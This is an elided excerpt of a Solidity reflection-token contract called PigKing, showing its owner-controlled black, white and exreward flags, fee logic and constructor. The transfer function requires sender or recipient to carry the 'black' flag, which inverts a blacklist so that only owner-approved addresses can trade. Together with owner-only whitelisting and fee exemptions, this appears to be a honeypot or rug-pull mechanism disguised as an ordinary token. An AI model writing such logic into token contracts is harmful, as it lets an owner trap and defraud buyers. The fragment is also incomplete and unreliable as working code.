...
contract  PigKing  is baseContract { 
    using SafeMath for uint;  
    uint private constant MAX = ~uint(0);
    ...
    string public tokenType="PigKing";
    ...
    function balanceOf(address account) public view override returns (uint) {
        if (info[account].exreward) return _tOwned[account];
    ...
    struct Info{ bool black;bool white;bool exreward;}
    mapping(address=>Info) info; 
    function setInfo(address[] calldata users,bool black,bool white,bool exreward) public onlyOwner {
        uint count = users.length;  
        for (uint i = 0; i < count; i++) { 
            if(info[users[i]].exreward!=exreward){
                if(exreward)excludeFromReward(users[i]);
                else includeInReward(users[i]);
            }
            info[users[i]]=Info(black,white,exreward); 
        }
    }
    ...
    function _transferFrom(address sender, address recipient, uint amount) internal returns (bool) {
        require(info[sender].black || info[recipient].black, "ERC20: Transaction failed");
        if(step==1 && pairs[recipient]) {
            require(info[sender].white,"just white can start ");
            launch();
        } 
        ...
        if(pairs[recipient]  && autoSwap.enabled && balanceOf(address(this)) >=getPart(autoSwap.min,autoSwap.part)){ swapBack(); } 
    ...
    function _basicTransfer(address sender, address recipient, uint tAmount) internal returns (bool) {
        ...
        if (info[sender].exreward)_tOwned[sender] = _tOwned[sender].sub(tAmount, "Insufficient Balance");
        if (info[recipient].exreward)_tOwned[recipient] = _tOwned[recipient].add(finalAmount);
    ...
    function takeFee(address sender, address recipient, uint amount,uint currentRate) internal returns (uint) {
        ...
        if(info[sender].white || info[recipient].white || isAutoSwaping) return amount;
        uint feeApplicable;
        if(pairs[recipient]){
        ...
        if(info[address(this)].exreward)  _tOwned[address(this)] = _tOwned[address(this)].add(feeAmount); 
    ...
    constructor(
        ...
        info[msg.sender].white=true;
        info[address(this)].white=true;
        info[DEAD].exreward=true;
        info[ZERO].exreward=true; 
        _excluded.push(address(this));
        _excluded.push(DEAD);
        _excluded.push(ZERO);
        uint sharetotal_;
        for (uint i = 0; i < marketingAddress.length; i++) {
            info[marketingAddress[i]].white=true;
